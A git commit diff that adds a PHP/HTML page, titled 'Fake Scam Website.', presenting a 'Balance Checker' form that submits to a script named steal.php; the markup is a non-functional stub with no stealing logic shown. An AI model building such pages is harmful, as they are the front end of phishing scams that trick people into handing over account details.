51a897b6127fb29e4e327cb1838f588322468715
cubesniper24 <46076583+cubesniper24@users.noreply.github.com>
2021-02-09 12:55:17 -0500

    Update index.php

--- index.php
+++ index.php
@@ -1,1 +1,13 @@
+<?php
 
+?>
+<html>
+  <head><title>Fake Scam Website.</title></html>
+  <body>
+    <center><h1 class="head">Balance Checker!</h1></center>
+    <form method="get" action="steal.php">
+      <center><input type="text" class="input"></center>
+      <center><input type="submit" class="submit"></center>
+    </form>
+  </body>
+</html>
